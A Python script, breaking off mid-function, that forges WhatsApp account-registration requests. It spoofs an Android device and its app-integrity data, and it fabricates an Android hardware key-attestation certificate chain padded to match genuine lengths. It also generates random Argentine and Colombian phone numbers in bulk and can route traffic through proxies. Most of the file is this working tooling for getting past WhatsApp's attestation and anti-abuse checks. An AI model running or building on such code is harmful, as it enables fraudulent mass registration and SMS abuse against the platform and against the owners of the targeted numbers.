#!/usr/bin/env python3
from __future__ import annotations

import argparse
import base64
import datetime as dt
import hashlib
import hmac
import json
import os
import random
import re
import secrets
import string
import subprocess
import tempfile
import time
import uuid
import warnings
from dataclasses import dataclass, replace
from pathlib import Path
from typing import Any

warnings.filterwarnings("ignore", message="urllib3 v2 only supports OpenSSL.*")

import requests
import urllib3
from cryptography import x509
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives import padding
from cryptography.hazmat.primitives.asymmetric import ec, utils as asymmetric_utils, x25519
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.primitives.ciphers.aead import AESGCM
from cryptography.hazmat.primitives.serialization import Encoding, NoEncryption, PrivateFormat, PublicFormat
from cryptography.x509.oid import NameOID, ObjectIdentifier

import wa_exist_probe

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

SERVER_PUBLIC_KEY_HEX = wa_exist_probe.SERVER_PUBLIC_KEY_HEX
CODE_URL = wa_exist_probe.CODE_URL
USER_AGENT = "WhatsApp/2.26.23.71 Android/11 Device/Xiaomi-M2007J3SC"
DEVICE_DISPLAY_ID = "M2007J3SC_11.0.14(CN01)"
FORM_SAFE = set(string.ascii_letters + string.digits + "-._~")

ANDROID_KEY_ATTESTATION_OID = ObjectIdentifier("1.3.6.1.4.1.11129.2.1.17")
NATIVE_ATTESTATION_PADDING_OID = ObjectIdentifier("1.3.6.1.4.1.11129.2.1.777")
NATIVE_ATTESTATION_ROOT_DER_LENGTH = 1312
NATIVE_ATTESTATION_FIRST_INTERMEDIATE_DER_LENGTH = 920
NATIVE_ATTESTATION_SECOND_INTERMEDIATE_DER_LENGTH = 505
NATIVE_ATTESTATION_LEAF_DER_LENGTH = 685
NATIVE_ATTESTATION_SIGNATURE_RAW_URL_LENGTH = 96
NATIVE_ATTESTATION_SIGNATURE_MAX_ATTEMPTS = 64

NATIVE_GPIA_PACKAGE_NAME = "com.whatsapp"
NATIVE_GPIA_SOURCE_SIZE = "141711087"
NATIVE_GPIA_SOURCE_DIGEST = "b3BumN//vPO0GypN5i+xXvNznZyGiXOT99Jip70omCg="
NATIVE_GPIA_SOURCE_FULL_DIGEST = "vJrNuYDSuWUZ87O1W5+xs/2g74mwPA2JO+dkqjlJZG4="
NATIVE_GPIA_CERT_DIGEST = "OKD31QX+GP7GT780Psqq8xDb15k="
NATIVE_GPIA_CLASSES_DIGEST = "qoblldcHz4lA84Sgs1QLZWPpd6YKG25zf0GwJZdTHXk="
NATIVE_GPIA_NATIVE_LIB_DIGEST = "G9McgxRaSjtq92o7zx0fbf3Ak7+SPmxxNyvNXS01hlM="
CURRENT_GPIA_DATA_SO_DIGEST = "SrL/HHWX9VAinH9OV4eloGSQLWSsUug93h5YGGad17s="
GHCR_GPIA_DATA_SO_DIGEST = "0j9kw9djlCtmCCavV7go2wwge+2os853ubiE7F7Dew4="
CURRENT_WAMSYS_REQUESTED_PERMISSIONS_DIGEST = "NNj5BoWX+yvZBYEY46Ze+Ad6Ykk0Z27FjgSysvkzzCU="
CURRENT_WAMSYS_AGE_BUCKET_SECONDS = 300
CURRENT_WAMSYS_FRESH_PROFILE_MAX_AGE_SECONDS = 600
CURRENT_WAMSYS_DATA_AGE_MIN_SECONDS = 30
CURRENT_WAMSYS_DATA_AGE_BASE_SECONDS = 54
CURRENT_WAMSYS_DATA_AGE_SPREAD_SECONDS = 36
CURRENT_WAMSYS_SOURCE_AHEAD_BASE_SECONDS = 8
CURRENT_WAMSYS_SOURCE_AHEAD_SPREAD_SECONDS = 24
CURRENT_WAMSYS_EXTERNAL_AHEAD_BASE_SECONDS = 8400
CURRENT_WAMSYS_EXTERNAL_AHEAD_SPREAD_SECONDS = 1800
REGISTRATION_REQUEST_KIND_CODE = 2

ARGENTINA_AREA_CODES = ("11", "221", "223", "261", "291", "341", "351", "381")
COLOMBIA_MOBILE_PREFIXES = ("300", "301", "302", "304", "305", "310", "311", "312", "313", "314", "315", "316", "317", "318", "320", "321", "322", "323", "350", "351")
SENSITIVE_KEY_RE = re.compile(r"(token|cookie|session|auth|key|sig|code|gpia|_g[aeigp]|aid)", re.I)


@dataclass(frozen=True)
class ShapeConfig:
    name: str
    client_metrics_source: str = "unknown|unknown"
    db: str = "1"
    device_ram: str = "6.58"
    network_radio_type: str = "1"
    device_display_id: str = DEVICE_DISPLAY_ID
    pid_mode: str = "current"
    operator_mode: str = "zero"
    sim_signal: bool = True
    gpia_error_code: int = -2
    gpia_data_so_digest: str = CURRENT_GPIA_DATA_SO_DIGEST
    gpia_source_mode: str = "current"
    gpia_escape_slash: bool = True
    wamsys_order: str = "current"
    wamsys_values: str = "current"


@dataclass(frozen=True)
class ProbeMaterial:
    cc: str
    national: str
    fdid: str
    expid: str
    expid_uuid: str
    access_session_id: str
    access_session_id_uuid: str
    id_raw: bytes
    backup_token_raw: bytes
    token: str
    authkey: str
    key_bundle: dict[str, str]
    advertising_id: str
    created_at_unix: int
    phone_sha256: str

    @property
    def e164(self) -> str:
        return "+" + self.cc + self.national

    @property
    def id_hex(self) -> str:
        return self.id_raw.hex()

    @property
    def backup_token_hex(self) -> str:
        return self.backup_token_raw.hex()


@dataclass
class Param:
    key: str
    value: str
    raw: bool = False


def pct_bytes(raw: bytes) -> str:
    out: list[str] = []
    for value in raw:
        ch = chr(value)
        if ch in FORM_SAFE:
            out.append(ch)
        else:
            out.append(f"%{value:02X}")
    return "".join(out)


def quote_form(value: str) -> str:
    return pct_bytes(value.encode("utf-8"))


def sha256_hex(value: str | bytes) -> str:
    raw = value if isinstance(value, bytes) else value.encode("utf-8")
    return hashlib.sha256(raw).hexdigest()


def short_hash(value: str | bytes) -> str:
    return sha256_hex(value)[:16]


def b64u(raw: bytes) -> str:
    return base64.urlsafe_b64encode(raw).decode("ascii").rstrip("=")


def b64std(raw: bytes) -> str:
    return base64.b64encode(raw).decode("ascii")


def decode_b64_any(value: str) -> bytes:
    padded = value.strip() + "=" * ((4 - len(value.strip()) % 4) % 4)
    try:
        return base64.urlsafe_b64decode(padded)
    except Exception:
        return base64.b64decode(padded)


def b64u_uuid_to_text(value: str) -> str:
    raw = decode_b64_any(value)
    if len(raw) != 16:
        return str(uuid.uuid4())
    return str(uuid.UUID(bytes=raw))


def normalize_proxy(value: str) -> str:
    value = value.strip()
    if not value:
        return ""
    if "://" not in value:
        return "http://" + value
    return value


def sanitize_text(value: str, proxy_url: str = "") -> str:
    text = value
    if proxy_url:
        text = text.replace(proxy_url, "<proxy>")
    text = re.sub(r"://[^/@\s]+@", "://<redacted>@", text)
    return text


def sanitize_response(value: Any) -> Any:
    if isinstance(value, dict):
        out: dict[str, Any] = {}
        for key, item in value.items():
            if SENSITIVE_KEY_RE.search(str(key)):
                out[str(key)] = "<redacted>"
            else:
                out[str(key)] = sanitize_response(item)
        return out
    if isinstance(value, list):
        return [sanitize_response(item) for item in value[:32]]
    if isinstance(value, str) and len(value) > 180:
        return value[:180] + "…"
    return value


def random_argentina_phone() -> tuple[str, str]:
    area = random.choice(ARGENTINA_AREA_CODES)
    subscriber_len = 10 - len(area)
    first = str(random.randint(2, 9))
    rest = "".join(str(random.randint(0, 9)) for _ in range(subscriber_len - 1))
    return "54", "9" + area + first + rest


def random_colombia_phone() -> tuple[str, str]:
    prefix = random.choice(COLOMBIA_MOBILE_PREFIXES)
    return "57", prefix + "".join(str(random.randint(0, 9)) for _ in range(7))


def normalize_phone(value: str, default_cc: str) -> tuple[str, str]:
    digits = re.sub(r"\D+", "", value)
    if not digits:
        raise ValueError("phone is empty")
    if value.strip().startswith("+") and digits.startswith(default_cc) and len(digits) > len(default_cc):
        return default_cc, digits[len(default_cc) :]
    if digits.startswith(default_cc) and len(digits) > len(default_cc) + 6:
        return default_cc, digits[len(default_cc) :]
    return default_cc, digits


def phone_inputs(args: argparse.Namespace) -> list[tuple[str, str]]:
    if args.phone:
        return [normalize_phone(phone, args.cc) for phone in args.phone]
    country = args.country.upper()
    if country == "AR":
        return [random_argentina_phone() for _ in range(args.count)]
    if country == "CO":
        return [random_colombia_phone() for _ in range(args.count)]
    raise ValueError("only --country AR/CO random generation is implemented; pass --phone for custom numbers")


def uuid_pair() -> tuple[str, str]:
    value = uuid.uuid4()
    return str(value), b64u(value.bytes)


def new_probe_material(repo_root: Path, cc: str, national: str) -> ProbeMaterial:
    state = wa_exist_probe.new_probe_state(repo_root, "+" + cc + national, cc, "mapped", {})
    expid_uuid = b64u_uuid_to_text(state.expid)
    access_session_id_uuid = b64u_uuid_to_text(state.access_session_id)
    return ProbeMaterial(
        cc=state.cc,
        national=state.national,
        fdid=state.fdid,
        expid=state.expid,
        expid_uuid=expid_uuid,
        access_session_id=state.access_session_id,
        access_session_id_uuid=access_session_id_uuid,
        id_raw=state.raw_id,
        backup_token_raw=state.raw_backup_token,
        token=state.token,
        authkey=state.authkey,
        key_bundle=state.key_bundle,
        advertising_id=str(uuid.uuid4()),
        created_at_unix=int(time.time()),
        phone_sha256=sha256_hex(state.cc + state.national),
    )


def stable_seed(material: ProbeMaterial, label: str) -> str:
    return "|".join(
        [
            "byte-v-forge-wa-native-runtime/v1",
            label.strip(),
            material.cc,
            material.national,
            material.phone_sha256,
            material.fdid,
            material.expid_uuid,
            material.access_session_id_uuid,
            material.authkey,
            material.key_bundle["e_ident"],
            material.authkey,
        ]
    )


def current_pid(material: ProbeMaterial) -> str:
    _ = material
    return str(os.getpid())


def runtime_token_current(material: ProbeMaterial, label: str) -> str:
    digest = hashlib.sha256(stable_seed(material, label).encode()).digest()
    return b64u(digest[:16])


def runtime_token_ghcr(material: ProbeMaterial, label: str) -> str:
    seed = "|".join(
        [
            "byte-v-forge-wa-gpia-source-dir/v1",
            label,
            material.cc,
            material.national,
            material.phone_sha256,
            material.fdid,
            material.expid_uuid,
            material.authkey,
        ]
    )
    return b64u(hashlib.sha256(seed.encode()).digest()[:16])


def gpia_source_dir(material: ProbeMaterial, config: ShapeConfig) -> str:
    if config.gpia_source_mode == "ghcr":
        first = runtime_token_ghcr(material, "source-dir-a")
        second = runtime_token_ghcr(material, "source-dir-b")
    else:
        first = runtime_token_current(material, "source-dir-prefix")
        second = runtime_token_current(material, "source-dir-package")
    return f"/data/app/~~{first}==/com.whatsapp-{second}==/base.apk"


def gpia_key_source(material: ProbeMaterial) -> str:
    public = decode_b64_any(material.authkey)
    if len(public) == 32:
        return b64std(public)
    return "default"


def render_json_value(value: Any, escape_slash: bool) -> str:
    if isinstance(value, str):
        return android_json_quote(value, escape_slash)
    if isinstance(value, bool):
        return "true" if value else "false"
    if value is None:
        return "null"
    if isinstance(value, int):
        return str(value)
    raise TypeError(f"unsupported JSON value type: {type(value)!r}")


def android_json_quote(value: str, escape_slash: bool = True) -> str:
    out = ['"']
    for char in value:
        code = ord(char)
        if char in {'"', "\\"} or (escape_slash and char == "/"):
            out.append("\\" + char)
        elif char == "\t":
            out.append(r"\t")
        elif char == "\b":
            out.append(r"\b")
        elif char == "\n":
            out.append(r"\n")
        elif char == "\r":
            out.append(r"\r")
        elif char == "\f":
            out.append(r"\f")
        elif code <= 0x1F:
            out.append(f"\\u{code:04x}")
        else:
            out.append(char)
    out.append('"')
    return "".join(out)


def render_ordered_json(fields: list[tuple[str, Any]], escape_slash: bool) -> str:
    parts = []
    for key, value in fields:
        parts.append(android_json_quote(key) + ":" + render_json_value(value, escape_slash))
    return "{" + ",".join(parts) + "}"


def aes_cbc_pkcs7_encrypt(key_source: str, plaintext: bytes) -> str:
    key = hashlib.sha256(key_source.encode()).digest()
    iv = secrets.token_bytes(16)
    padder = padding.PKCS7(128).padder()
    padded = padder.update(plaintext) + padder.finalize()
    encryptor = Cipher(algorithms.AES(key), modes.CBC(iv)).encryptor()
    ciphertext = encryptor.update(padded) + encryptor.finalize()
    return b64std(iv + ciphertext)


def encrypt_gpia_json(key_source: str, fields: list[tuple[str, Any]], config: ShapeConfig) -> str:
    plaintext = render_ordered_json(fields, config.gpia_escape_slash).encode("utf-8")
    return aes_cbc_pkcs7_encrypt(key_source, plaintext)


def build_gpia(material: ProbeMaterial, config: ShapeConfig) -> dict[str, str]:
    source_dir = gpia_source_dir(material, config)
    key_source = gpia_key_source(material)
    primary = encrypt_gpia_json(
        key_source,
        [
            ("sizeInBytes", NATIVE_GPIA_SOURCE_SIZE),
            ("packageName", NATIVE_GPIA_PACKAGE_NAME),
            ("code", config.gpia_error_code),
            ("shatr", NATIVE_GPIA_SOURCE_DIGEST),
            ("p", source_dir),
            ("cert", NATIVE_GPIA_CERT_DIGEST),
            ("sha256", NATIVE_GPIA_SOURCE_FULL_DIGEST),
        ],
        config,
    )
    compact = encrypt_gpia_json(key_source, [("_ic", config.gpia_error_code)], config)
    device = encrypt_gpia_json(
        key_source,
        [
            ("_dh", NATIVE_GPIA_CLASSES_DIGEST),
            ("_iln", config.gpia_data_so_digest),
            ("_isb", NATIVE_GPIA_SOURCE_SIZE),
            ("_ip", NATIVE_GPIA_PACKAGE_NAME),
            ("did", config.device_display_id),
            ("_p", source_dir),
            ("_ln", NATIVE_GPIA_NATIVE_LIB_DIGEST),
            ("_ist", NATIVE_GPIA_SOURCE_DIGEST),
            ("_icr", NATIVE_GPIA_CERT_DIGEST),
            ("_is", NATIVE_GPIA_SOURCE_FULL_DIGEST),
        ],
        config,
    )
    return {"gpia": primary, "_gg": compact, "_gi": device}


def derive_local_wamsys_bytes(material: ProbeMaterial, label: str, length: int) -> bytes:
    seed = "|".join(
        [
            "byte-v-forge-wa-wamsys-precision/v1",
            label,
            material.cc,
            material.national,
            material.phone_sha256,
            material.fdid,
            material.expid_uuid,
            material.access_session_id_uuid,
            material.id_hex,
            material.backup_token_hex,
            material.authkey,
            material.key_bundle["e_ident"],
        ]
    )
    key = hashlib.sha256(seed.encode()).digest()
    out = b""
    counter = 0
    while len(out) < length:
        out += hmac.new(key, label.encode() + counter.to_bytes(4, "big"), hashlib.sha256).digest()
        counter += 1
    return out[:length]


def current_boot_id(material: ProbeMaterial) -> str:
    raw = bytearray(hashlib.sha256(stable_seed(material, "boot-id").encode()).digest()[:16])
    raw[6] = (raw[6] & 0x0F) | 0x40
    raw[8] = (raw[8] & 0x3F) | 0x80
    return str(uuid.UUID(bytes=bytes(raw)))


def current_boot_id_material(material: ProbeMaterial) -> str:
    proc_file_bytes = (current_boot_id(material) + "\n").encode()
    return b64std(hashlib.sha256(proc_file_bytes).digest())


def current_wamsys_runtime_offset(material: ProbeMaterial, label: str, base: int, spread: int, now: int) -> int:
    if spread <= 0:
        return base
    bucket = now // CURRENT_WAMSYS_AGE_BUCKET_SECONDS
    seed = "|".join(
        [
            "byte-v-forge-wa-wamsys-runtime-path-age/v1",
            label,
            str(REGISTRATION_REQUEST_KIND_CODE),
            str(bucket),
            material.cc,
            material.national,
            material.phone_sha256,
            material.fdid,
            material.access_session_id_uuid,
            material.authkey,
        ]
    )
    return base + int.from_bytes(hashlib.sha256(seed.encode()).digest()[:8], "big") % spread


def current_wamsys_path_ages(material: ProbeMaterial, now: int | None = None) -> tuple[int, int, int]:
    current = int(time.time()) if now is None else now
    profile_age = current - material.created_at_unix
    if CURRENT_WAMSYS_DATA_AGE_MIN_SECONDS <= profile_age <= CURRENT_WAMSYS_FRESH_PROFILE_MAX_AGE_SECONDS:
        data_age = profile_age
    else:
        data_age = current_wamsys_runtime_offset(
            material,
            "data-dir-age",
            CURRENT_WAMSYS_DATA_AGE_BASE_SECONDS,
            CURRENT_WAMSYS_DATA_AGE_SPREAD_SECONDS,
            current,
        )
    source_age = data_age + current_wamsys_runtime_offset(
        material,
        "source-data-age-delta",
        CURRENT_WAMSYS_SOURCE_AHEAD_BASE_SECONDS,
        CURRENT_WAMSYS_SOURCE_AHEAD_SPREAD_SECONDS,
        current,
    )
    external_age = data_age + current_wamsys_runtime_offset(
        material,
        "external-data-age-delta",
        CURRENT_WAMSYS_EXTERNAL_AHEAD_BASE_SECONDS,
        CURRENT_WAMSYS_EXTERNAL_AHEAD_SPREAD_SECONDS,
        current,
    )
    return source_age, data_age, external_age


def build_current_ga(material: ProbeMaterial, config: ShapeConfig) -> str:
    key_source = gpia_key_source(material)
    boot_id_material = current_boot_id_material(material)
    bi = aes_cbc_pkcs7_encrypt(key_source, boot_id_material.encode())
    source_age, data_age, external_age = current_wamsys_path_ages(material)
    fields = [("bi", bi), ("ap", source_age), ("ai", data_age), ("mp", False), ("ae", external_age), ("mu", False)]
    return render_ordered_json(fields, config.gpia_escape_slash)


def build_ghcr_ga(material: ProbeMaterial, config: ShapeConfig) -> str:
    bi = b64std(derive_local_wamsys_bytes(material, "_ga.bi", 64))
    fields = [("ai", 141), ("ae", 0), ("ap", 172), ("bi", bi), ("mp", False), ("mu", False)]
    return render_ordered_json(fields, config.gpia_escape_slash)


def current_android_id(material: ProbeMaterial) -> str:
    seed = "|".join(
        [
            "byte-v-forge-wa-wamsys-android-id/v1",
            material.phone_sha256,
            material.fdid,
            material.expid_uuid,
            material.access_session_id_uuid,
            material.id_hex,
            material.backup_token_hex,
            material.authkey,
        ]
    )
    return hashlib.sha256(seed.encode()).digest()[:8].hex()


def current_wamsys_aid(material: ProbeMaterial) -> str:
    return b64std(hashlib.sha256(current_android_id(material).encode()).digest())


def build_wamsys(material: ProbeMaterial, config: ShapeConfig) -> dict[str, str]:
    gpia = build_gpia(material, config)
    if config.wamsys_values == "ghcr":
        values = {
            "gpia": gpia["gpia"],
            "_ge": '{"sb":false,"sv":false}',
            "_gi": gpia["_gi"],
            "_gg": gpia["_gg"],
            "_gp": b64std(derive_local_wamsys_bytes(material, "_gp", 32)),
            "_ga": build_ghcr_ga(material, config),
            "aid": b64std(derive_local_wamsys_bytes(material, "aid", 32)),
        }
    else:
        values = {
            "gpia": gpia["gpia"],
            "_ga": build_current_ga(material, config),
            "_gi": gpia["_gi"],
            "_gp": CURRENT_WAMSYS_REQUESTED_PERMISSIONS_DIGEST,
            "_ge": '{"sb":false,"sv":false}',
            "aid": current_wamsys_aid(material),
            "_gg": gpia["_gg"],
        }
    order = ["gpia", "_ge", "_gi", "_gg", "_gp", "_ga", "aid"] if config.wamsys_order == "ghcr" else ["gpia", "_ga", "_gi", "_gp", "_ge", "aid", "_gg"]
    return {key: values[key] for key in order if key in values}


def operator_fields(config: ShapeConfig) -> dict[str, str]:
    if config.operator_mode == "omit":
        return {}
    if config.operator_mode == "ar722310":
        return {"mcc": "722", "mnc": "310", "sim_mcc": "722", "sim_mnc": "310"}
    if config.operator_mode == "co732101":
        return {"mcc": "732", "mnc": "101", "sim_mcc": "732", "sim_mnc": "101"}
    return {"mcc": "000", "mnc": "000", "sim_mcc": "000", "sim_mnc": "000"}


def device_fields(material: ProbeMaterial, config: ShapeConfig) -> dict[str, str]:
    fields = {
        "mistyped": "7",
        "reason": "",
        "hasav": "2",
        "client_metrics": json.dumps(
            {"attempts": 1, "app_campaign_download_source": config.client_metrics_source},
            separators=(",", ":"),
        ),
        "education_screen_displayed": "false",
        "prefer_sms_over_flash": "false",
        "network_radio_type": config.network_radio_type,
        "simnum": "0",
        "hasinrc": "1",
        "pid": "29418" if config.pid_mode == "ghcr" else current_pid(material),
        "rc": "0",
        "device_ram": config.device_ram,
        "db": config.db,
        "recaptcha": '{"stage":"ABPROP_DISABLED"}',
        "feo2_query_status": "did_not_query",
    }
    fields.update(operator_fields(config))
    if config.sim_signal:
        has_sim = fields.get("simnum") == "1" or fields.get("sim_mcc", "000") not in {"", "000"}
        fields.update(
            {
                "sim_type": "1" if has_sim else "0",
                "airplane_mode_type": "0",
                "cellular_strength": "5",
                "roaming_type": "0",
            }
        )
    return fields


def add_param(params: list[Param], key: str, value: str, raw: bool = False) -> None:
    params.append(Param(key=key, value=value, raw=raw))


def build_code_params(material: ProbeMaterial, config: ShapeConfig, args: argparse.Namespace) -> list[Param]:
    fields = device_fields(material, config)
    wamsys = build_wamsys(material, config)
    params: list[Param] = []
    add_param(params, "cc", material.cc)
    add_param(params, "in", material.national)
    add_param(params, "lg", "en")
    add_param(params, "lc", "US")
    add_param(params, "fdid", material.fdid)
    add_param(params, "expid", material.expid)
    add_param(params, "access_session_id", material.access_session_id)
    add_param(params, "id", pct_bytes(material.id_raw), raw=True)
    add_param(params, "backup_token", pct_bytes(material.backup_token_raw), raw=True)
    add_param(params, "token", material.token)
    add_param(params, "method", "sms")
    add_param(params, "advertising_id", material.advertising_id)
    add_param(params, "authkey", material.authkey)
    for key in ["e_ident", "e_keytype", "e_regid", "e_skey_id", "e_skey_val", "e_skey_sig"]:
        add_param(params, key, material.key_bundle[key])
    for key in [
        "mistyped",
        "reason",
        "hasav",
        "client_metrics",
        "mcc",
        "mnc",
        "sim_mcc",
        "sim_mnc",
        "education_screen_displayed",
        "prefer_sms_over_flash",
        "network_radio_type",
        "simnum",
        "hasinrc",
        "pid",
        "rc",
        "sim_type",
        "airplane_mode_type",
        "cellular_strength",
        "roaming_type",
        "device_ram",
    ]:
        if key in fields and (fields[key] != "" or key == "reason"):
            add_param(params, key, pct_bytes(fields[key].encode()), raw=True)
    add_param(params, "gpia", pct_bytes(wamsys["gpia"].encode()), raw=True)
    add_param(params, "db", pct_bytes(fields["db"].encode()), raw=True)
    add_param(params, "recaptcha", pct_bytes(fields["recaptcha"].encode()), raw=True)
    for key, value in wamsys.items():
        if key == "gpia":
            continue
        add_param(params, key, pct_bytes(value.encode()), raw=True)
    add_param(params, "feo2_query_status", pct_bytes(fields["feo2_query_status"].encode()), raw=True)
    apply_param_overrides(params, args.set_param, args.omit)
    return params


def apply_param_overrides(params: list[Param], sets: list[str], omits: list[str]) -> None:
    omit_set = {item.strip() for item in omits if item.strip()}
    if omit_set:
        params[:] = [param for param in params if param.key not in omit_set]
    for item in sets:
        if "=" not in item:
            raise ValueError(f"--set expects key=value, got {item!r}")
        key, value = item.split("=", 1)
        key = key.strip()
        if not key:
            raise ValueError("--set key is empty")
        encoded = pct_bytes(value.encode())
        for param in params:
            if param.key == key:
                param.value = encoded
                param.raw = True
                break
        else:
            params.append(Param(key=key, value=encoded, raw=True))


def render_plain(params: list[Param]) -> str:
    return "&".join(f"{quote_form(param.key)}={param.value if param.raw else quote_form(param.value)}" for param in params)


def encrypt_wasafe(plain: str) -> str:
    server = x25519.X25519PublicKey.from_public_bytes(bytes.fromhex(SERVER_PUBLIC_KEY_HEX))
    private = x25519.X25519PrivateKey.generate()
    _ = private.private_bytes(Encoding.Raw, PrivateFormat.Raw, NoEncryption())
    public = private.public_key().public_bytes(Encoding.Raw, PublicFormat.Raw)
    shared = private.exchange(server)
    sealed = AESGCM(shared).encrypt(b"\x00" * 12, plain.encode("utf-8"), None)
    return b64u(public + sealed)


def der_len(length: int) -> bytes:
    if length < 0x80:
        return bytes([length])
    raw = length.to_bytes((length.bit_length() + 7) // 8, "big")
    return bytes([0x80 | len(raw)]) + raw


def der_tlv(tag: int, value: bytes) -> bytes:
    return bytes([tag]) + der_len(len(value)) + value


def der_integer(value: int) -> bytes:
    raw = value.to_bytes(max(1, (value.bit_length() + 7) // 8), "big")
    if raw[0] & 0x80:
        raw = b"\x00" + raw
    return der_tlv(0x02, raw)


def der_enumerated(value: int) -> bytes:
    raw = value.to_bytes(max(1, (value.bit_length() + 7) // 8), "big")
    if raw[0] & 0x80:
        raw = b"\x00" + raw
    return der_tlv(0x0A, raw)


def der_octet_string(value: bytes) -> bytes:
    return der_tlv(0x04, value)


def der_sequence(*items: bytes) -> bytes:
    return der_tlv(0x30, b"".join(items))


def native_android_key_attestation_challenge(material: ProbeMaterial) -> bytes:
    return int(time.time()).to_bytes(8, "big") + b"\x1f" + decode_b64_any(material.authkey)


def native_android_key_attestation_extension(material: ProbeMaterial) -> bytes:
    empty_authorization_list = der_sequence()
    return der_sequence(
        der_integer(3),
        der_enumerated(1),
        der_integer(4),
        der_enumerated(1),
        der_octet_string(native_android_key_attestation_challenge(material)),
        der_octet_string(b""),
        empty_authorization_list,
        empty_authorization_list,
    )


def native_attestation_serial_name() -> x509.Name:
    return x509.Name([x509.NameAttribute(NameOID.SERIAL_NUMBER, secrets.token_hex(16))])


def native_attestation_leaf_name() -> x509.Name:
    return x509.Name([x509.NameAttribute(NameOID.COMMON_NAME, "Android Keystore Key")])


def native_attestation_serial() -> int:
    return secrets.randbits(128) or 1


def native_cert_builder(
    subject: x509.Name,
    issuer: x509.Name,
    public_key: ec.EllipticCurvePublicKey,
    now: dt.datetime,
    is_ca: bool,
    path_length: int | None,
    extensions: list[x509.ExtensionType],
) -> x509.CertificateBuilder:
    builder = (
        x509.CertificateBuilder()
        .subject_name(subject)
        .issuer_name(issuer)
        .public_key(public_key)
        .serial_number(native_attestation_serial())
        .not_valid_before(now - dt.timedelta(minutes=1))
        .not_valid_after(now + dt.timedelta(days=365))
        .add_extension(x509.BasicConstraints(ca=is_ca, path_length=path_length), critical=True)
        .add_extension(
            x509.KeyUsage(
                digital_signature=True,
                content_commitment=False,
                key_encipherment=False,
                data_encipherment=False,
                key_agreement=False,
                key_cert_sign=is_ca,
                crl_sign=False,
                encipher_only=False,
                decipher_only=False,
            ),
            critical=True,
        )
    )
    for extension in extensions:
        builder = builder.add_extension(extension, critical=False)
    return builder


def sign_padded_certificate(
    subject: x509.Name,
    issuer: x509.Name,
    public_key: ec.EllipticCurvePublicKey,
    signer_key: ec.EllipticCurvePrivateKey,
    now: dt.datetime,
    is_ca: bool,
    path_length: int | None,
    extensions: list[x509.ExtensionType],
    target_length: int,
) -> bytes:
    padding_length = 0
    best = b""
    for _ in range(24):
        padded_extensions = list(extensions)
        if padding_length > 0:
            padded_extensions.append(x509.UnrecognizedExtension(NATIVE_ATTESTATION_PADDING_OID, secrets.token_bytes(padding_length)))
        cert = native_cert_builder(subject, issuer, public_key, now, is_ca, path_length, padded_extensions).sign(signer_key, hashes.SHA256())
        der = cert.public_bytes(Encoding.DER)
        best = der
        diff = target_length - len(der)
        if diff == 0:
            return der
        padding_length = max(0, padding_length + diff)
    return best


@dataclass(frozen=True)
class WASafeEnvelope:
    body: str
    authorization: str
    enc_hash: str
    h_hash: str


def build_signed_wasafe_envelope(plain: str, material: ProbeMaterial, mode: str) -> WASafeEnvelope:
    enc = encrypt_wasafe(plain)
    if mode == "unsigned":
        return WASafeEnvelope(body="ENC=" + enc, authorization="", enc_hash=short_hash(enc), h_hash="")
    if mode == "empty":
        return WASafeEnvelope(body="ENC=" + enc + "&H=", authorization="", enc_hash=short_hash(enc), h_hash="")

    now = dt.datetime.now(dt.timezone.utc)
    leaf_key = ec.generate_private_key(ec.SECP256R1())
    root_key = ec.generate_private_key(ec.SECP256R1())
    first_key = ec.generate_private_key(ec.SECP256R1())
    second_key = ec.generate_private_key(ec.SECP256R1())

    root_subject = native_attestation_serial_name()
    first_subject = x509.Name(
        [
            x509.NameAttribute(NameOID.SERIAL_NUMBER, secrets.token_hex(16)),
            x509.NameAttribute(NameOID.ORGANIZATIONAL_UNIT_NAME, "TEE"),
        ]
    )
    second_subject = x509.Name(
        [
            x509.NameAttribute(NameOID.SERIAL_NUMBER, secrets.token_hex(16)),
            x509.NameAttribute(NameOID.ORGANIZATIONAL_UNIT_NAME, "TEE"),
        ]
    )
    leaf_subject = native_attestation_leaf_name()

    root_der = sign_padded_certificate(
        root_subject,
        root_subject,
        root_key.public_key(),
        root_key,
        now,
        True,
        2,
        [],
        NATIVE_ATTESTATION_ROOT_DER_LENGTH,
    )
    first_der = sign_padded_certificate(
        first_subject,
        root_subject,
        first_key.public_key(),
        root_key,
        now,
        True,
        1,
        [],
        NATIVE_ATTESTATION_FIRST_INTERMEDIATE_DER_LENGTH,
    )
    second_der = sign_padded_certificate(
        second_subject,
        first_subject,
        second_key.public_key(),
        first_key,
        now,
        True,
        0,
        [],
        NATIVE_ATTESTATION_SECOND_INTERMEDIATE_DER_LENGTH,
    )
    leaf_der = sign_padded_certificate(
        leaf_subject,
        second_subject,
        leaf_key.public_key(),
        second_key,
        now,
        False,
        None,
        [x509.UnrecognizedExtension(ANDROID_KEY_ATTESTATION_OID, native_android_key_attestation_extension(material))],
        NATIVE_ATTESTATION_LEAF_DER_LENGTH,
    )
    chain_der = root_der + first_der + second_der + leaf_der

    digest = hashlib.sha256(enc.encode("ascii")).digest()
    signature = b""
    for _ in range(NATIVE_ATTESTATION_SIGNATURE_MAX_ATTEMPTS):
        candidate = leaf_key.sign(digest, ec.ECDSA(asymmetric_utils.Prehashed(hashes.SHA256())))
        signature = candidate
        if len(b64u(candidate)) == NATIVE_ATTESTATION_SIGNATURE_RAW_URL_LENGTH:
            break
    h_value = b64u(signature)
    return WASafeEnvelope(
        body="ENC=" + enc + "&H=" + h_value,
        authorization=base64.b64encode(chain_der).decode("ascii"),
        enc_hash=short_hash(enc),
        h_hash=short_hash(h_value),
    )


def summarize_response(data: dict[str, Any]) -> dict[str, Any]:
    reason = str(data.get("reason") or data.get("failure_reason") or "")
    status = str(data.get("status") or "")
    return {
        "status": status,
        "reason": reason,
        "no_routes": reason == "no_routes",
        "request_failed": reason in {"missing_param", "bad_param", "bad_token", "old_version", "invalid_skey"},
        "length": data.get("length"),
        "sms_wait": data.get("sms_wait"),
        "send_sms_wait": data.get("send_sms_wait"),
        "voice_wait": data.get("voice_wait"),
        "wa_old_wait": data.get("wa_old_wait"),
        "email_otp_wait": data.get("email_otp_wait"),
        "flash_wait": data.get("flash_wait"),
    }


def param_shape(params: list[Param]) -> str:
    parts = []
    for param in params:
        value = param.value
        if param.raw:
            try:
                value = requests.utils.unquote(value)
            except Exception:
                pass
        mode = "raw" if param.raw else "form"
        parts.append(f"{param.key}:{len(value.encode())}:{mode}")
    return ",".join(parts)


def param_value_hashes(params: list[Param]) -> str:
    parts = []
    for param in params:
